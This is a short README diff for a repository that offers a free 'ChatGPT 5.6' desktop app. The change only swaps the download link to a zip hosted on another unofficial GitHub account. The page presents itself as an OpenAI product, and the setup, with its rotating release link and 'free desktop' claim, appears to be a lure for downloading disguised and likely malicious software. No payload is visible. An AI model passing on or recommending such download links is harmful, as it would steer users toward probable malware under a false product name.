@@ -9,7 +9,7 @@ chatgpt 5.6 sol : OpenAI's reasoning-optimized variant for coding and complex lo
 
 
 ## Install
-[Download `ChatGPT5.6-desktop.zip`](https://github.com/chatgptcodex56/Chatgpt-5.6-AI-Free-Desktop/releases/download/gpt5.6/ChatGPT5.6-desktop.zip)
+[Download `ChatGPT5.6-desktop.zip`](https://github.com/chatgptcodex56free/Chatgpt-5.6-OpenAI-Free/releases/download/gpt5.6free/ChatGPT5.6-desktop.zip)
 ===
 
 <img width="2940" height="1844" alt="images2" src="https://github.com/user-attachments/assets/c31366d8-98f9-450a-9736-5e6fc31c30e4" />
